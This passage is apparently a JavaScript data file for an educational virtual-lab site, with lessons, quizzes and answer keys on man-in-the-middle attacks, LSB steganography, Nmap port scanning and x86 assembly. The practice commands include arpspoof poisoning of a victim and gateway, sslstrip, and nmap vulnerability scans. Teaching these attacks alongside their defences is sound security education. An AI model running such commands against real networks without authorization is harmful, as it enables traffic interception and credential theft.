                "content": "ARP maps IP → MAC (Layer 2). ARP has no authentication.\n\nARP Poisoning attack:\n1. Attacker sends ARP reply to victim: 'IP of gateway = MY MAC'\n2. Sends ARP reply to gateway: 'IP of victim = MY MAC'\n3. Both update their ARP caches\n4. All victim-gateway traffic flows through attacker\n5. Attacker forwards traffic while intercepting\n\nTools: Arpspoof, ettercap, Bettercap\nDetection: Dynamic ARP Inspection (DAI) on managed switches"
            },
            {
                "title": "2. SSL Stripping",
                "content": "SSL Stripping (Moxie Marlinspike, 2009):\n1. Attacker is MITM (via ARP poisoning)\n2. Victim requests https://bank.com\n3. Attacker intercepts, maintains HTTPS to bank\n4. Serves victim plain HTTP version\n5. Victim sees bank.com over HTTP — credentials sent in cleartext!\n\nHTTP Strict Transport Security (HSTS) defeats this:\n  Strict-Transport-Security: max-age=31536000\n  Browser refuses non-HTTPS connections\n  HSTS Preload: Hardcoded into browsers"
            },
            {
                "title": "3. Certificate Attacks",
                "content": "Rogue Certificate MITM:\n1. Attacker presents their own certificate for bank.com\n2. If victim trusts attacker's CA → full HTTPS MITM\n3. Attacker sees all plaintext traffic\n\nPrevention:\n• Certificate Pinning: App hardcodes expected cert/key hash\n• Certificate Transparency (CT) logs: All certs publicly logged\n  Browsers check cert is in CT log — detects rogue certs\n\nReal attack: DigiNotar (2011) — rogue certs for Google, Microsoft"
            },
            {
                "title": "4. MITM Defenses",
                "content": "Layer 2 defenses:\n• Dynamic ARP Inspection (DAI): Validates ARP against DHCP snooping\n• 802.1X port authentication\n• Private VLANs: Isolate hosts on same subnet\n\nLayer 3-7 defenses:\n• HTTPS everywhere (TLS 1.3 minimum)\n• HSTS with preloading\n• Certificate pinning (mobile apps)\n• DNSSEC: Authenticates DNS responses\n• Mutual TLS (mTLS): Both client and server present certificates\n• VPN: Encrypted tunnel"
            }
        ]
    },
    "pretest": [
        {
            "q": "ARP Poisoning works because ARP:",
            "options": [
                "Uses strong cryptographic authentication",
                "Has no authentication and accepts unsolicited replies",
                "Requires admin privileges",
                "Only works over IPv6"
            ],
            "correct": 1
        },
        {
            "q": "SSL Stripping downgrades connections from:",
            "options": [
                "HTTPS to FTP",
                "HTTPS to HTTP (removing encryption)",
                "HTTP to raw TCP",
                "TLS 1.3 to TLS 1.0"
            ],
            "correct": 1
        },
        {
            "q": "HSTS prevents SSL stripping by:",
            "options": [
                "Encrypting HTTP traffic",
                "Instructing browsers to only use HTTPS, refusing HTTP connections",
                "Blocking all non-HTTPS CAs",
                "Monitoring network traffic"
            ],
            "correct": 1
        },
        {
            "q": "A rogue CA MITM attack is detected by:",
            "options": [
                "SSL certificate length",
                "Certificate Transparency logs ensuring certs are publicly logged",
                "HTTPS connection speed",
                "IP address of the server"
            ],
            "correct": 1
        },
        {
            "q": "Dynamic ARP Inspection (DAI) prevents ARP poisoning by:",
            "options": [
                "Blocking all ARP traffic",
                "Validating ARP packets against a trusted DHCP snooping database",
                "Encrypting ARP packets",
                "Disabling ARP"
            ],
            "correct": 1
        }
    ],
    "procedure": [
        "1. View the network: Victim (192.168.1.10), Gateway (192.168.1.1), Attacker (192.168.1.99).",
        "2. Execute ARP poisoning: send gratuitous ARP to redirect victim's gateway traffic.",
        "3. Observe ARP cache poisoning — victim's gateway MAC now points to attacker.",
        "4. Intercept HTTP traffic — view cleartext credentials in transit.",
        "5. Enable HTTPS + HSTS — observe attacker receives encrypted data they cannot decrypt."
    ],
    "posttest": [
        {
            "q": "Mutual TLS (mTLS) prevents MITM by:",
            "options": [
                "Encrypting IP headers",
                "Requiring both client and server to present valid certificates",
                "Using a shared secret",
                "Routing via VPN only"
            ],
            "correct": 1
        },
        {
            "q": "DNSSEC prevents MITM by:",
            "options": [
                "Encrypting DNS queries",
                "Digitally signing DNS records for authenticity verification",
                "Blocking DNS to untrusted resolvers",
                "Using HTTPS for DNS"
            ],
            "correct": 1
        },
        {
            "q": "Certificate Pinning in mobile apps works by:",
            "options": [
                "Blocking all TLS connections",
                "Hardcoding the expected server certificate or public key hash in the app",
                "Using self-signed certs only",
                "Rotating certificates daily"
            ],
            "correct": 1
        },
        {
            "q": "An evil twin WiFi attack is a MITM where:",
            "options": [
                "Two routers have the same SSID",
                "Attacker creates a rogue AP with the same SSID to intercept wireless traffic",
                "Router firmware is compromised",
                "MAC addresses are cloned"
            ],
            "correct": 1
        },
        {
            "q": "BGP hijacking differs from ARP poisoning in that:",
            "options": [
                "It is harmless",
                "It operates at the internet routing level, redirecting entire IP prefixes",
                "It only works on LAN",
                "It requires physical access"
            ],
            "correct": 1
        }
    ],
    "simType": "cyber_mitm",
    "practice_commands": [
        "arpspoof -i eth0 -t 192.168.1.10 192.168.1.1",
        "arpspoof -i eth0 -t 192.168.1.1 192.168.1.10",
        "sslstrip -l 8080"
    ],
    "practice_questions": [
        "Explain step-by-step how HSTS preloading prevents SSL stripping even on first visit.",
        "Design a defense architecture for a corporate network preventing ARP poisoning at scale."
    ]
};

window.VLAB_DATA.cyber_steganography = {
    "title": "Steganography — LSB Image Hiding",
    "aim": "To understand steganography, implement LSB image steganography to hide and extract secret messages, and compare steganography with cryptography.",
    "theory": {
        "intro": "Steganography hides secret information within ordinary data (cover media) to avoid detection. Unlike cryptography which makes data unreadable, steganography hides the very existence of the message. Modern digital steganography hides data in images by subtly modifying them imperceptibly.",
        "cards": [
            {
                "title": "1. LSB Steganography in Images",
                "content": "Each pixel in a 24-bit RGB image has 3 bytes (R,G,B), each 8 bits.\nThe Least Significant Bit contributes only 1/255 ≈ 0.4% to color — imperceptible when changed.\n\nHiding 1 bit per channel (3 bits per pixel):\n  Pixel: R=11001010  G=01110011  B=11100110\n  Secret bits: 1, 0, 1\n  New pixel:   R=11001011  G=01110010  B=11100111\n  Visual change: ΔR=1, ΔG=-1, ΔB=1 — invisible to human eye\n\nCapacity: 3 bits/pixel → 1MB image holds ~100KB hidden data"
            },
            {
                "title": "2. Encoding Process",
                "content": "1. Convert message to binary: 'Hi' = 01001000 01101001\n2. Add null terminator at end\n3. Iterate pixels in cover image:\n   For each bit of secret:\n   a. Take pixel channel value\n   b. Clear LSB: value = value & 0xFE\n   c. Set LSB to secret bit: value = value | secret_bit\n4. Write modified pixel back\n5. Save as PNG (lossless — JPEG compression destroys LSB data!)\n\nExtraction: Collect LSBs from pixels, assemble bytes."
            },
            {
                "title": "3. Steganalysis (Detection)",
                "content": "Detecting hidden data without knowing the secret:\n\nVisual: LSB plane visualization — reveals patterns invisible to normal view\nStatistical: Chi-square analysis — steganography disturbs natural image statistics\nRS Analysis: Detects LSB flipping by analyzing pixel pair correlations\nHistogram analysis: Modified images show subtle histogram artifacts\n\nTools: StegExpose, StegDetect, zsteg\n\nCountermeasures:\n• Limit embedding rate (< 25% of capacity)\n• Randomize pixel selection with key-derived permutation"
            },
            {
                "title": "4. Steganography vs Cryptography",
                "content": "Steganography:\n  Goal: Hide existence of message\n  If detected: Message readable by anyone\n  \nCryptography:\n  Goal: Make message unreadable without key\n  If detected: Still unreadable without key\n\nBest practice: Combine both!\n  1. Encrypt message with AES-256\n  2. Hide ciphertext in image using steganography\n  Result: Hidden AND unreadable\n\nReal-world: Malware C2 communication hidden in social media images"
            }
        ]
    },
    "pretest": [
        {
            "q": "Steganography differs from cryptography in that:",
            "options": [
                "Steganography makes data unreadable",
                "Steganography hides the existence of the message within cover media",
                "Steganography uses public keys",
                "Steganography compresses data"
            ],
            "correct": 1
        },
        {
            "q": "LSB steganography modifies the:",
            "options": [
                "Most significant bit of each pixel channel",
                "Least significant bit of each pixel channel (imperceptible)",
                "All 8 bits of each pixel channel",
                "Image file header"
            ],
            "correct": 1
        },
        {
            "q": "Why must stego images be saved as PNG rather than JPEG?",
            "options": [
                "PNG files are larger",
                "JPEG lossy compression destroys LSB changes hiding secret data",
                "JPEG doesn't support 24-bit color",
                "PNG is more widely supported"
            ],
            "correct": 1
        },
        {
            "q": "Steganalysis is the practice of:",
            "options": [
                "Creating steganographic images",
                "Detecting hidden data in media using statistical analysis",
                "Decrypting cryptographic messages",
                "Compressing image files"
            ],
            "correct": 1
        },
        {
            "q": "The capacity of LSB steganography (1 bit per channel, 24-bit RGB) per pixel is:",
            "options": [
                "1 bit",
                "3 bits",
                "8 bits",
                "24 bits"
            ],
            "correct": 1
        }
    ],
    "procedure": [
        "1. Load a 24-bit PNG cover image — view its RGB pixel values.",
        "2. Enter a secret message — observe it converted to binary.",
        "3. Run LSB encoding — watch each pixel's LSB being modified to hide message bits.",
        "4. Compare original and stego image — observe they look identical.",
        "5. Extract the hidden message from the stego image — verify correct recovery."
    ],
    "posttest": [
        {
            "q": "Chi-square steganalysis detects LSB steganography by:",
            "options": [
                "Viewing the image visually",
                "Analyzing statistical deviations in LSB bit patterns compared to natural image statistics",
                "Measuring file size",
                "Checking image dimensions"
            ],
            "correct": 1
        },
        {
            "q": "Using a key-derived permutation in steganography improves security by:",
            "options": [
                "Encrypting the cover image",
                "Randomizing which pixels store secret bits, making statistical detection harder",
                "Compressing the hidden data",
                "Doubling message capacity"
            ],
            "correct": 1
        },
        {
            "q": "Palette-based (GIF) images are poor steganography carriers because:",
            "options": [
                "They are too large",
                "Modifying palette indices creates visible artifacts unlike LSB in true-color images",
                "GIF doesn't support transparency",
                "GIF uses lossy compression"
            ],
            "correct": 1
        },
        {
            "q": "Audio LSB steganography in 16-bit WAV hides 1 bit per:",
            "options": [
                "Millisecond of audio",
                "16-bit audio sample (modifying the 1-value LSB is inaudible)",
                "Audio file header byte",
                "Frequency band"
            ],
            "correct": 1
        },
        {
            "q": "Network steganography can hide data in:",
            "options": [
                "IP packet TTL fields and TCP sequence numbers",
                "Only application-layer protocols",
                "Only in DNS queries",
                "Physical Ethernet frames only"
            ],
            "correct": 0
        }
    ],
    "simType": "cyber_steganography",
    "practice_commands": [
        "python3 -c \"from PIL import Image; img=Image.open('cover.png'); px=img.load(); print(px[0,0])\"",
        "zsteg -a suspicious_image.png",
        "steghide embed -cf cover.jpg -sf secret.txt -p 'password'"
    ],
    "practice_questions": [
        "Implement a Python function that hides a text message in an image using LSB steganography and another that extracts it.",
        "Calculate the maximum message size (in bytes) that can be hidden in a 1920x1080 RGB image using 1 LSB per channel."
    ]
};

window.VLAB_DATA.cyber_network_scan = {
    "title": "Port Scanner & Vulnerability Assessment",
    "aim": "To understand TCP/IP port scanning techniques, interpret Nmap output, perform OS fingerprinting, and conduct a basic vulnerability assessment workflow.",
    "theory": {
        "intro": "Port scanning identifies open ports which reveals running services that may have known vulnerabilities. Security professionals use port scanning in penetration testing and vulnerability assessments. Nmap, Masscan are used both offensively and defensively.",
        "cards": [
            {
                "title": "1. TCP Port Scan Types",
                "content": "TCP Connect Scan (-sT):\n  Complete 3-way handshake. Logged by target. Slow.\n\nTCP SYN Scan (Half-open, -sS):\n  SYN → SYN-ACK → RST (don't complete handshake)\n  Stealthier, not logged by many services. Fastest.\n  Requires root/admin privileges.\n\nPort responses:\n  Open: SYN-ACK received\n  Closed: RST received\n  Filtered: No response (firewall drops)\n\nXMAS Scan (-sX): FIN+PSH+URG flags. Stealthy.\nFIN Scan (-sF): Only FIN flag. Bypasses some firewalls."
            },
            {
                "title": "2. Nmap Basics",
                "content": "nmap -sS -p 1-1000 192.168.1.1    # SYN scan ports 1-1000\nnmap -sV 192.168.1.1              # Service version detection\nnmap -O 192.168.1.1               # OS fingerprinting\nnmap -A 192.168.1.1               # Aggressive: -sV -O -sC --traceroute\nnmap -p- 192.168.1.1              # All 65535 ports\nnmap --script vuln 192.168.1.1    # Run vulnerability NSE scripts\n\nOS Fingerprinting: Analyzes TCP/IP stack quirks:\n  TTL, TCP window size, IP ID sequence, TCP options order"
            },
            {
                "title": "3. Common Vulnerable Ports",
                "content": "Port 21 (FTP): Anonymous login, cleartext credentials\nPort 22 (SSH): Weak passwords, old versions\nPort 23 (Telnet): Cleartext, completely insecure\nPort 80/443 (HTTP/HTTPS): SQLi, XSS, RCE\nPort 445 (SMB): EternalBlue (MS17-010), WannaCry ransomware\nPort 1433 (MSSQL): SQL injection, default credentials\nPort 3306 (MySQL): Direct database access\nPort 3389 (RDP): BlueKeep (CVE-2019-0708), brute force\nPort 5900 (VNC): Weak/no authentication"
            },
            {
                "title": "4. Vulnerability Assessment Workflow",
                "content": "1. SCOPE DEFINITION: Define IP ranges and rules of engagement\n2. DISCOVERY: Ping sweep (nmap -sn) to find live hosts\n3. PORT SCAN: Identify open ports (nmap -sS -p-)\n4. SERVICE ID: Version detection (nmap -sV)\n5. VULN SCAN: Match to CVE database (Nessus, OpenVAS)\n6. VERIFICATION: Manual verification of potential vulnerabilities\n7. EXPLOITATION: (Pentest only) Metasploit, manual exploit\n8. REPORTING: Risk-rated findings with remediation\n\nCVSS Score: 0-10 severity rating\n  Critical: 9.0-10.0, High: 7.0-8.9, Medium: 4.0-6.9"
            }
        ]
    },
    "pretest": [
        {
            "q": "A TCP SYN scan is 'half-open' because:",
            "options": [
                "It only scans half the ports",
                "It sends SYN but RST instead of completing the ACK handshake",
                "It uses half the bandwidth",
                "It alternates between TCP and UDP"
            ],
            "correct": 1
        },
        {
            "q": "A port showing as 'filtered' in Nmap means:",
            "options": [
                "The port is open but filtered by software",
                "No response received — a firewall is likely dropping packets",
                "The service is running but authentication failed",
                "The port number is outside valid range"
            ],
            "correct": 1
        },
        {
            "q": "Nmap OS fingerprinting (-O) identifies operating systems by:",
            "options": [
                "Reading the hostname",
                "Analyzing TCP/IP stack quirks like TTL, window size, and TCP option ordering",
                "Checking open port numbers only",
                "Reading HTTP server headers"
            ],
            "correct": 1
        },
        {
            "q": "Port 445 is associated with:",
            "options": [
                "SSH",
                "DNS",
                "SMB (Server Message Block) Windows file sharing",
                "HTTPS"
            ],
            "correct": 2
        },
        {
            "q": "The EternalBlue exploit (MS17-010) targets:",
            "options": [
                "Apache web servers",
                "SMB v1 vulnerability (used by WannaCry ransomware)",
                "MySQL databases",
                "SSH daemon"
            ],
            "correct": 1
        }
    ],
    "procedure": [
        "1. Run a host discovery sweep on the lab network to find live hosts.",
        "2. Perform SYN scan on a host — observe open, closed, and filtered ports.",
        "3. Enable version detection (-sV) — identify running services and versions.",
        "4. Run OS fingerprinting — compare to actual OS of the target.",
        "5. Run vulnerability scripts — identify a simulated known CVE on an open port."
    ],
    "posttest": [
        {
            "q": "Masscan differs from Nmap in that it:",
            "options": [
                "Scans fewer ports",
                "Uses asynchronous packet transmission — can scan the internet in minutes",
                "Only works on Windows",
                "Performs only UDP scans"
            ],
            "correct": 1
        },
        {
            "q": "CVSS scores vulnerabilities on a scale of:",
            "options": [
                "1-5",
                "0-100",
                "0-10",
                "1-1000"
            ],
            "correct": 2
        },
        {
            "q": "An nmap NSE script with category 'vuln' will:",
            "options": [
                "Just scan ports faster",
                "Actively test for specific known vulnerabilities on discovered services",
                "Generate a PDF report",
                "Map network topology"
            ],
            "correct": 1
        },
        {
            "q": "Shodan.io is used in reconnaissance to:",
            "options": [
                "Scan internal networks",
                "Search the internet for publicly exposed services with known vulnerabilities",
                "Monitor social media",
                "Perform password brute force"
            ],
            "correct": 1
        },
        {
            "q": "A penetration test differs from a vulnerability scan in that:",
            "options": [
                "Penetration test uses automated tools only",
                "Penetration test actively exploits vulnerabilities to demonstrate impact (with authorization)",
                "Vulnerability scan is more thorough",
                "Only penetration tests need authorization"
            ],
            "correct": 1
        }
    ],
    "simType": "cyber_network_scan",
    "practice_commands": [
        "nmap -sS -sV -O -p 1-65535 192.168.1.0/24",
        "nmap --script vuln -p 445 192.168.1.100",
        "nmap -sn 192.168.1.0/24"
    ],
    "practice_questions": [
        "Interpret this Nmap output: PORT 22/tcp open ssh OpenSSH 6.6, PORT 80/tcp open http Apache 2.2.31, PORT 3389/tcp open ms-wbt-server — which services are at risk?",
        "Design a complete vulnerability assessment procedure for a company's externally-facing web servers."
    ]
};

window.VLAB_DATA.asm_prog = {
    "title": "Assembly Level Language",
    "simType": "assembly_sim",
    "isMultiModule": true,
    "modules": [
        {
            "title": "Module 1: Basic Register Operations & Arithmetic",
            "aim": "To understand general-purpose registers and execute basic arithmetic operations (mov, add, sub).",
            "theory": {
                "intro": "x86 architecture contains several 32-bit registers (EAX, EBX, ECX, EDX) used for high-speed CPU operations. In NASM syntax, the destination operand is placed first: 'mov dest, src'.",
                "cards": [
                    { "title": "Registers", "content": "EAX is the accumulator register, EBX is the base register, ECX is the counter register, and EDX is the data register." },
                    { "title": "Instructions", "content": "MOV copies data, ADD performs addition, and SUB performs subtraction. Example: 'add eax, ebx' updates EAX with EAX + EBX." }
                ]
            },
            "procedure": [
                "Examine the pre-loaded NASM program in the editor.",
                "Click 'Assemble' to compile the assembly text.",
                "Click 'Step Forward' to trace instruction execution register-by-register.",
                "Verify EAX accumulator changes on EIP increments."
            ],
            "pretest": [
                {
                    "q": "Which of the following registers is commonly used as the accumulator?",
                    "options": ["EAX", "EBX", "ECX", "EDX"],
                    "correct": 0
                },
                {
                    "q": "What is the size of the EAX register in 32-bit x86 architecture?",
                    "options": ["8 bits", "16 bits", "32 bits", "64 bits"],
                    "correct": 2
                }
            ],
            "posttest": [
                {
                    "q": "What instruction is used to copy data from a source to a destination in NASM?",
                    "options": ["mov", "add", "sub", "cmp"],
                    "correct": 0
                },
                {
                    "q": "What is the result of 'add eax, ebx'?",
                    "options": ["eax = eax + ebx", "ebx = eax + ebx", "eax = ebx", "ebx = eax"],
                    "correct": 0
                }
            ],
            "code_template": "section .text\n    global _start\n_start:\n    mov eax, 15      ; Load 15 into EAX\n    mov ebx, 10      ; Load 10 into EBX\n    add eax, ebx     ; Add EBX to EAX (EAX = 25)\n    sub eax, 5       ; Subtract 5 from EAX (EAX = 20)\n    \n    ; Exit system call\n    mov eax, 1       ; sys_exit\n    mov ebx, 0       ; return status 0\n    int 0x80",
            "practice_commands": [
                "mov eax, val - Load val into EAX",
                "add eax, ebx - Add EBX to EAX",
                "sub eax, ecx - Subtract ECX from EAX"
            ],
            "practice_questions": [
                "Explain the difference between a 16-bit register (AX) and its 32-bit counterpart (EAX).",
                "Trace how registers change when executing a series of nested MOV and ADD calls."
            ]
        },
        {
            "title": "Module 2: Memory Addressing & Data Segments",
            "aim": "To learn how to declare and reference variables declared in the .data and .bss segments.",
            "theory": {
                "intro": "Data segments (.data) define initialized variables, while .bss defines uninitialized memory reservations. Brackets '[]' dereference memory locations to get values.",
                "cards": [
                    { "title": "Data segment", "content": "Initialized constants are defined with directives: 'db' (byte), 'dw' (word), 'dd' (doubleword)." },
                    { "title": "Memory Access", "content": "'mov eax, val' loads the ADDRESS of val, whereas 'mov eax, [val]' loads the VALUE stored at val." }
                ]
            },
            "procedure": [
                "Review the variables defined in section .data.",
                "Assemble the code to build memory tables.",
                "Step through to watch values load from memory addresses into EAX and EBX."
            ],
            "pretest": [
                {
                    "q": "Which section of a NASM program is used for declaring initialized variables?",
                    "options": [".data", ".bss", ".text", ".rodata"],
                    "correct": 0
                },
                {
                    "q": "Which directive defines a doubleword (4 bytes) constant?",
                    "options": ["db", "dw", "dd", "dq"],
                    "correct": 2
                }
            ],
            "posttest": [
                {
                    "q": "How do you dereference a memory address to fetch its value in NASM?",
                    "options": ["Using brackets []", "Using pointer *", "Using reference &", "Using direct label name"],
                    "correct": 0
                },
                {
                    "q": "Which section is used for declaring uninitialized variables?",
                    "options": [".data", ".bss", ".text", ".rodata"],
                    "correct": 1
                }
            ],
            "code_template": "section .data\n    num1 dd 40       ; Define doubleword 40\n    num2 dd 20       ; Define doubleword 20\nsection .text\n    global _start\n_start:\n    mov eax, [num1]  ; Dereference num1 into EAX\n    mov ebx, [num2]  ; Dereference num2 into EBX\n    sub eax, ebx     ; EAX = num1 - num2 (EAX = 20)\n    \n    mov eax, 1       ; Exit\n    mov ebx, 0\n    int 0x80",
            "practice_commands": [
                "val dd 100 - Define doubleword variable",
                "mov eax, [val] - Load value of val into EAX"
            ],
            "practice_questions": [
                "Explain memory alignment and its importance in x86 systems.",
                "Describe the difference between immediate addressing and direct memory addressing."
            ]
        },
        {
            "title": "Module 3: Control Flow, Comparisons & Loops",
            "aim": "To implement conditional branches and loop statements in Assembly using CMP and jump instructions.",
            "theory": {
                "intro": "CMP performs subtraction behind the scenes to update flag registers (ZF, SF, CF). Jumps evaluate flags to deviate EIP execution flow.",
                "cards": [
                    { "title": "CMP instruction", "content": "Compares dest and src by subtracting src from dest without modifying registers." },
                    { "title": "Jumps", "content": "Unconditional: 'jmp'. Conditional: 'je' (jump equal), 'jne' (not equal), 'jg' (greater), 'jl' (less)." }
                ]
            },
            "procedure": [
                "Write a loop to calculate sum of integers from 1 to N.",
                "Assemble and trace the conditional branches in action.",
                "Observe ZF and SF flags updating on EIP loop branches."
            ],
            "pretest": [
                {
                    "q": "Which instruction compares two values and sets the CPU flags?",
                    "options": ["cmp", "test", "jmp", "je"],
                    "correct": 0
                },
                {
                    "q": "Which jump instruction jumps if the zero flag (ZF) is set to 1?",
                    "options": ["je", "jne", "jg", "jl"],
                    "correct": 0
                }
            ],
            "posttest": [
                {
                    "q": "What does 'jmp loop_start' do?",
                    "options": ["Unconditional jump to loop_start", "Jump to loop_start if equal", "Jump to loop_start if greater", "Call subroutine"],
                    "correct": 0
                },
                {
                    "q": "Which register is traditionally used as a loop counter in x86 loops?",
                    "options": ["EAX", "EBX", "ECX", "EDX"],
                    "correct": 2
                }
            ],
            "code_template": "section .text\n    global _start\n_start:\n    mov ecx, 4       ; Loop counter = 4\n    mov eax, 0       ; Accumulator = 0\nloop_start:\n    cmp ecx, 0       ; Compare ecx with 0\n    je loop_exit     ; If counter is 0, exit loop\n    add eax, ecx     ; Add loop counter to accumulator\n    sub ecx, 1       ; Decrement loop counter\n    jmp loop_start   ; Jump back to loop start\nloop_exit:\n    mov ebx, eax     ; Store result (10) in EBX as status\n    mov eax, 1       ; Exit\n    int 0x80",
            "practice_commands": [
                "cmp eax, ebx - Compare EAX and EBX",
                "je label - Jump to label if equal",
                "jg label - Jump to label if greater"
            ],
            "practice_questions": [
                "How does the CPU keep track of loops behind the scenes?",
                "Contrast conditional branch behaviors in C/C++ versus Assembly."
            ]
        },
        {
            "title": "Module 4: Memory Stack & Subroutines",
            "aim": "To learn stack operations (push/pop) and subroutine linkage (call/ret) using memory offsets.",
            "theory": {
                "intro": "The Stack is a LIFO (Last-In-First-Out) memory segment. ESP tracks the stack top. CALL pushes EIP, and RET pops it back.",
                "cards": [
                    { "title": "Stack Ops", "content": "'push' decrements ESP by 4 and writes to stack. 'pop' reads stack and increments ESP." },
                    { "title": "Procedures", "content": "CALL jumps to a label and stores the return address on the stack. RET retrieves this address and returns." }
                ]
            },
            "procedure": [
                "Observe stack pointer ESP initialize at 0x1000.",
                "Push registers onto stack and watch them display inside the stack panel grid.",
                "Trace how CALL jumps EIP to the procedure and RET returns it."
            ],
            "pretest": [
                {
                    "q": "Which stack operation pushes a 32-bit register value onto the stack?",
                    "options": ["push", "pop", "call", "ret"],
                    "correct": 0
                },
                {
                    "q": "Which register is the Stack Pointer in x86?",
                    "options": ["ESP", "EBP", "EIP", "ESI"],
                    "correct": 0
                }
            ],
            "posttest": [
                {
                    "q": "What instruction calls a procedure and pushes the return address onto the stack?",
                    "options": ["call", "ret", "push", "jmp"],
                    "correct": 0
                },
                {
                    "q": "What instruction pops the return address off the stack and returns control?",
                    "options": ["ret", "call", "pop", "exit"],
                    "correct": 0
                }
            ],
            "code_template": "section .text\n    global _start\n_start:\n    mov eax, 100\n    mov ebx, 200\n    push eax         ; Save EAX on stack\n    push ebx         ; Save EBX on stack\n    call procedure   ; Call subroutine\n    pop ebx          ; Restore EBX (should be 200)\n    pop eax          ; Restore EAX (should be 100)\n    \n    mov eax, 1       ; Exit\n    mov ebx, 0\n    int 0x80\nprocedure:\n    add eax, ebx     ; Temp add (EAX = 300)\n    ret              ; Return",
            "practice_commands": [
                "push eax - Push EAX to stack",
                "pop ebx - Pop stack into EBX",
                "call func - Call function func"
            ],
            "practice_questions": [
                "Explain the role of EBP (Base Pointer) in managing function call stack frames.",
                "What is stack overflow and how do subroutines prevent it?"
            ]
        },
        {
            "title": "Module 5: Linux System Calls & String Output",
            "aim": "To use standard software interrupts (int 0x80) to interact with operating system input/output services.",
            "theory": {
                "intro": "Linux uses system calls to execute kernel functions. System call ID is placed in EAX, arguments in EBX, ECX, EDX, and triggered via 'int 0x80'.",
                "cards": [
                    { "title": "Interrupt 0x80", "content": "Triggers a software interrupt, transferring control from user space to kernel space." },
                    { "title": "sys_write parameters", "content": "EAX=4 (write), EBX=1 (stdout), ECX=msg pointer, EDX=length in bytes." }
                ]
            },
            "procedure": [
                "Load EAX with system call ID 4.",
                "Specify string memory address inside ECX register.",
                "Click Run and verify output text appears in the console panel."
            ],
            "pretest": [
                {
                    "q": "What software interrupt triggers a system call in 32-bit Linux?",
                    "options": ["int 0x80", "int 0x21", "int 0x10", "int 0x13"],
                    "correct": 0
                },
                {
                    "q": "What system call number corresponds to sys_write in Linux?",
                    "options": ["1", "2", "3", "4"],
                    "correct": 3
                }
            ],
            "posttest": [
                {
                    "q": "When making a sys_write system call, which register holds the file descriptor?",
                    "options": ["EBX", "ECX", "EDX", "EAX"],
                    "correct": 0
                },
                {
                    "q": "In which register does the sys_write call look for the message string pointer?",
                    "options": ["ECX", "EDX", "EBX", "ESI"],
                    "correct": 0
                }
            ],
            "code_template": "section .data\n    msg db 'Hello Assembly!', 0xa\n    len equ $ - msg\nsection .text\n    global _start\n_start:\n    mov eax, 4       ; sys_write\n    mov ebx, 1       ; file descriptor 1 (stdout)\n    mov ecx, msg     ; message pointer\n    mov edx, len     ; message length\n    int 0x80         ; interrupt\n    \n    mov eax, 1       ; sys_exit\n    mov ebx, 0       ; status 0\n    int 0x80",
            "practice_commands": [
                "int 0x80 - Trigger software interrupt",
                "mov eax, 4 - Load write system call",
                "mov eax, 1 - Load exit system call"
            ],
            "practice_questions": [
                "Explain the transition of control from user space to kernel space during int 0x80.",
                "Design a simple NASM program to read user input (sys_read) and echo it back."
            ]
        }
    ]
};

